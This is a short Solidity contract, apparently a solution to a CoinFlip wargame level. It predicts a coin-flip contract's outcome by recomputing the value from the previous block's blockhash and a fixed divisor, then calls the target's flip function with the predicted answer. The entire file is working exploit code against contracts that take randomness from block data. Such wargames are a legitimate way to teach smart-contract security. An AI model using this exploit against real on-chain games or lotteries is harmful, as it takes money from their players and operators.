// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.4;

contract CoinFlipAttack {
    error UhOh();
    
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function exploit(address coinFlipContract) external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        (bool success, ) = coinFlipContract.call(abi.encodeWithSignature("flip(bool)", side));
        if (!success) {
            revert UhOh();
        }
    }
}